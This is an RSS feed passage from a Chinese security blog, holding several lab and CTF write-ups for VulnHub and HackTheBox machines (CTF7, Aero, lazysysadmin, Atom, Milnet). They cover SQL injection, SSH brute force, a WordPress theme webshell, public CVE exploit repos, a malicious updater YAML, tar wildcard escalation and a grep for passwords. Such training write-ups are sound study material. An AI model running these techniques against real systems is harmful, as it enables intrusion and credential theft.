&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE800c57352f8b65ac29a8c70bb6fab2c2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后访问即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5bc826032ea059785650a96a8e9d39a3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权：&lt;/h1&gt;
&lt;p&gt;提权使用常规思维又是卡了很久，但是卡住的时候往往答案很简单，信息检索就行，使用linpeas.sh并没有帮我提取出来需要的内容，只能手动查找：&lt;/p&gt;
&lt;p&gt;查找pass关键词i文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -R -i pass /home/* 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8f0d9c340eb525a5eae98c55dbcb9595%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE97ef93e48505336d9b2f2ddb5176020b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;没有flag&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;感觉是有点体力活儿的意思，不太好搞&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x031 LampSecurity CTF7</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x031-lampsecurity-ctf7/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x031-lampsecurity-ctf7/</guid>
      <description>&lt;p&gt;坏了，又不能自动获取IP地址，然后看了一下随靶机附带的文件，密码还是错的&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE166850e169c593dffba25e28fa031cc4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能进centos6的单用户模式进去修改配置文件了：&lt;a href=&#34;https://blog.csdn.net/qq_40576436/article/details/125164748&#34;&gt;https://blog.csdn.net/qq_40576436/article/details/125164748&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DHCP半天获取不到，索性直接配置静态了，配置文件如下，复制了lo环回口的配置文件，修改了一些：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEef61dfc71754f421d1e825906c0eb630%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE20d083d70777bce78b8fa53c62f8d20e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;ssh和smb暂时没有发现东西，看来突破口应该是在80，901，8080，10000这几个HTTP端口：&lt;/p&gt;
&lt;p&gt;说实话这台靶机有运气的成分在里面，web扫描都没用，因为是抽时间做的，&lt;/p&gt;
&lt;p&gt;首先是注册框存在sql注入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd6a086820bb2c996b4473638eaec971f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后我就直接上sqlmap跑了一下数据库，但是存在一个问题，这地方是注册的地方，导致数据库内容插入了很多脏东西，后面我就换了一个地方注入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEde63507c30ac9a453b4f101506bed750%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这个地方我试了几个ID，其中就有3，这里是个提示，说brian是专家，后面就用上了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdd4431984a0afcb6db355a604fb70a73%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;随后我继续注入，dump了所有用户，下面一坨就是注入加入的用户，删掉：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE584c80a55c2955aa02b585cd4b541504%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把hash解密一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1df040a8d2101ce4c83677a9b260638b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;做成账号密码本，进行ssh爆破：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfc0db90b0b07cbd1b9e2574d5dd73c22%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里爆破了一堆账号：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEde5c2a4465dc9247b1a33092ca8934db%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;我随机登录了一个账号，看了一下sudo权限，然后看了一下家目录，确实是这么多用户，而且其中大部分是有密码的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5733097a4a04d7b501d8755edb9b3742%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个时候我想起来了先前sql注入的地方的ID，说brian是专家，有没有可能brian的权限会高一些，随后我就切换到brian去了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7e60ab52d4fd0000b3a713fad9c8c100%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;后面看了一下红笔视频&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X032 Aero</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x032-aero/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x032-aero/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3750b7f1fc2738082cd7871831d3edafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe0654ee3d610ebcd14d3a5ba9650ae07image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb6abefba514da9dd59d306ff8a843ea3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;单从靶机的端口开放情况来看，只有80端口开放，web渗透获取立足点，或者有knockd？但是这不是linux，暂且看看吧，没有什么头绪，不是现场的框架，也没有其他端口开放，同时没有其他目录和域名，后面看了一下WP。&lt;/p&gt;
&lt;p&gt;windows 主题 themes&lt;/p&gt;
&lt;p&gt;是有个win11的主题漏洞，研究一下怎么打吧：&lt;/p&gt;
&lt;p&gt;git clone &lt;a href=&#34;https://github.com/Jnnshschl/CVE-2023-38146.git&#34;&gt;https://github.com/Jnnshschl/CVE-2023-38146.git&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE773a351fb7a3fcdd79d4258fc2f1cbf6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;python3 -m pip install -r requirements.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa8ce4703d341cf4a2f7355c08ecd11beimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo apt-get install g++-mingw-w64-x86-64&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8288500b6dee031de9e04ba372635e58image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;运行：&lt;/p&gt;
&lt;p&gt;这里的IP和端口都是本地IP端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE789bb20b3b5d29bddb3ead726e61bd48image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;开启监听：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7cd34b427d7310495d28128b404d9efimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE19a69ea993df83c9cc54837c7de94b52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可能要多尝试几次：&lt;/p&gt;
&lt;p&gt;后台应该是个计划任务，对于这些非服务端的攻击，其实真的很难有现成的复现资料：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd6acd0c9b9b41a2e0eb889042889301aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE07735a3a4c81bcac2a8ec7b984f40cd0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那个ps1脚本看起来就是触发脚本，然后那个pdf的内容是再提示漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb172412664b5050414524af622297decimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去github找现成的：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/duck-sec/CVE-2023-28252-Compiled-exe&#34;&gt;https://github.com/duck-sec/CVE-2023-28252-Compiled-exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc39591775bad6a6622f9ab5b84a67f52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用msf生成一个木马，然后nc监听即可：&lt;/p&gt;
&lt;p&gt;.\exploit.exe 1208 1 cxk.exe，比较简单&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf99bb16e37461ce4aa58db5e114830aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x032 lazysysadmin</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x032-lazysysadmin/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x032-lazysysadmin/</guid>
      <description>&lt;p&gt;这个靶机的网络环境建议直接使用自带的NAT，折腾了一会儿桥接，算了&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE72d08c1b1b33442a24aefef7e2dd85e2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE913fadb661d1be6ad997f2b8d151d3fd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEce67c11b54ab1775c3260d79679abae9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1b7c82ea0bef70c52d8f88983586720d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;大概看了一下开放端口和脚本扫描情况，大部分是常规端口，比较让人在意的是6667端口的irc服务，非常规服务，搜索了一下如何利用：&lt;/p&gt;
&lt;p&gt;试了几个payload都不行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE648c582fd1610675ca160aeca15f5046%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5348002957b2fe8528d516f5d6f5bd4c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挂载到本地慢慢看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3d4c787b2b3d27b9471048a0a7995ef4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似可用信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5387be05bf182af18b80f053abc6a20c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5c390678d56ad9bb45609de099ca2ae2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc1a4aa7ddae6bb4905197064fa054fe4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;mysql passwd:&lt;/p&gt;
&lt;p&gt;admin&lt;/p&gt;
&lt;p&gt;TogieMYSQL12345^^&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3cb813f0b54a85fa2d08ea6896737f55%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不让连：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf3dc66aee2cd2605d826cde9cddbbf1e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就web渗透吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE99bcc89ff554b4ba8f30a175111e1016%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wp疑似用户名？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7e55b84059143f8886483c6a8a61144%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan扫一下：&lt;/p&gt;
&lt;p&gt;两个用户名没有插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf4a5cce86e62459ed90cbb1e111868d7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用刚刚收集的密码试了一下，果然，毕竟靶机名字叫lazysysadmin&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc03b87b06cb11c44d26db41edc00afd9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后台getsghell：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://192.168.1.138/wordpress/wp-content/themes/twentyfifteen/404.php&#34;&gt;http://192.168.1.138/wordpress/wp-content/themes/twentyfifteen/404.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa206dfd6e8a9dc0d5803560d01bd0047%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;额，早该想到的，lazysysadmin&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3049624f0d62c6b7e14d39312d167d3b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbb5af2dc8c822faf67f910aa63b5bba2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;果然懒啊，sudo权限这样给：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE81f08b76f4f9d223db807d8d1270b253%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X033 Atom</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x033-atom/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x033-atom/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8b12b40668a685aaf03708f82a1327faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE838d3d2c7c7be70a575948e081b49644image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf47224e81e57676fb1dc66b138668843image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;从端口开放情况来看，值得关注的点有：smb、redis、5985、80、443&lt;/p&gt;
&lt;p&gt;先看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0126d08eed606a7b2849f6baa4b2eb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里的内容，似乎在说，把程序放在这个目录，会自动运行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE83261bfc23c13a3b3e76b0efea015b67image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;创建者Pages&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa81fdd7469055ca0d7cfaa9467a380b7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看redis呢：&lt;/p&gt;
&lt;p&gt;好像不行，没有未授权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fc7da8c0119ea9131f9d3f0407ce0cfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;web方面，443和80页面一样：&lt;/p&gt;
&lt;p&gt;发现文件，下载：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4dda52a834bc2cb9dab0160b6a02b2b1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb确实有写入权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7924124077b02f05625e98a0b4b4984bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;程序看起来没有什么特别的，逆向看看把：&lt;/p&gt;
&lt;p&gt;好像没逆向出来，有点尴尬：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE489df158a57e08c89bb85f55c6b06d6bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;抓包看看了：&lt;/p&gt;
&lt;p&gt;发现dns查询，添加hosts抓取tun0：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06ea8bc4271baa0819b7b662b66ad474image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后大概了解一下，程序通过访问目标上的yml文件，然后根据yml文件的内容，来尝试更新软件，然后结合刚刚PDF的内容，我们可以上传一个yml文件，指向我们的exe程序，就可以尝试getshell了：&lt;/p&gt;
&lt;p&gt;计算一下值：&lt;/p&gt;
&lt;p&gt;sha512sum &amp;ldquo;8&#39;889.exe&amp;rdquo; | cut -d &amp;rsquo; &amp;rsquo; -f1 | xxd -r -p | base64 -w0&lt;/p&gt;
&lt;p&gt;jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc521913fef8b1266a49fa85f4714dfd3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;yml文件内容如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;version: 1.0.1
files:
 - url: 8&amp;#39;889.exe
   sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
   size: 73802
path: 8&amp;#39;889.exe
sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传上去：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x033 Milnet</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x033-milnet/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x033-milnet/</guid>
      <description>&lt;p&gt;这台靶机的网络很棒，能桥接，还能自动告诉咋们IP地址&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa3613cd58e1766b1f64062b552945d74%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE13482f9d87fa08afddc390f6189f74b4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf10e92bf472185f88c8e89af154e1b0e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;就两个端口，直接看80呗：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7fbe03601bbb56b42c0b78c15ce61ea7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;抓包看了一下数据包，发现确实存在远程文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE05d04d462add4336b384a9e3349da83c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;弹shell吧，这里看报错就可以知道，应该是逻辑处理的地方添加了php后缀：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE71656d2d3631a661ebeb9c498b8e30f3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe7ecf0b20d849e7e0269ce46b445e679%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEba6a7f434d0f879b5652a30810d07096%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查了一些资料，关于tar通配符提权：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/jhinjax/p/17067082.html&#34;&gt;https://www.cnblogs.com/jhinjax/p/17067082.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第一次尝试失败了，我猜测是下面这个红框里面的原因，没有引号，中间有空格，让人操蛋的是，这玩意儿删不掉：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf645dfaef77a30b8bf4b30a85f0bc5b5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
